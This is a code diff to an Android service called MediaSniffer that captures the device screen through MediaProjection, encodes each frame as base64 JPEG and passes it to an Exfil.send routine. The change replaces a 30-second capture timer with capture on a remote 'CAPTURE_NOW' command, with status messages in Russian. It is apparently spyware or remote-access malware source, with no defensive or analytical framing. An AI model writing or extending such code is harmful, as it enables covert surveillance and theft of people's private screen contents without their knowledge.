@@ -12,7 +12,6 @@ import android.media.Image;
 import android.media.ImageReader;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
-import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -31,8 +30,6 @@ public class MediaSniffer extends Service {
     private Handler handler = new Handler(Looper.getMainLooper());
     private boolean running = false;
 
-    private static final long INTERVAL_MS = 30000; // раз в 30 секунд
-
     public static Intent buildIntent(Context ctx, int resultCode, Intent data) {
         Intent i = new Intent(ctx, MediaSniffer.class);
         i.putExtra("code", resultCode);
@@ -42,6 +39,16 @@ public class MediaSniffer extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null && "CAPTURE_NOW".equals(intent.getAction())) {
+            if (running) {
+                handler.post(this::capture);
+                Exfil.send("CMD", "Скрин по команде");
+            } else {
+                Exfil.send("CMD", "MediaProjection не запущен");
+            }
+            return START_STICKY;
+        }
+
         if (intent == null || running) return START_STICKY;
 
         int code = intent.getIntExtra("code", Activity.RESULT_CANCELED);
@@ -67,19 +74,14 @@ public class MediaSniffer extends Service {
             reader.getSurface(), null, handler);
 
         running = true;
-        schedule();
         return START_STICKY;
-    }
-
-    private void schedule() {
-        handler.postDelayed(this::capture, INTERVAL_MS);
     }
 
     private void capture() {
         if (!running) return;
         try {
             Image img = reader.acquireLatestImage();
-            if (img == null) { schedule(); return; }
+            if (img == null) return;
 
             Image.Plane[] planes = img.getPlanes();
             ByteBuffer buf = planes[0].getBuffer();
@@ -94,7 +96,7 @@ public class MediaSniffer extends Service {
 
             Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, width, height);
             ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            cropped.compress(Bitmap.CompressFormat.JPEG, 50, bos);
+            cropped.compress(Bitmap.CompressFormat.JPEG, 60, bos);
             byte[] bytes = bos.toByteArray();
 
             String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
@@ -103,7 +105,6 @@ public class MediaSniffer extends Service {
             bmp.recycle();
             cropped.recycle();
         } catch (Throwable ignored) {}
-        schedule();
     }
 
     @Override
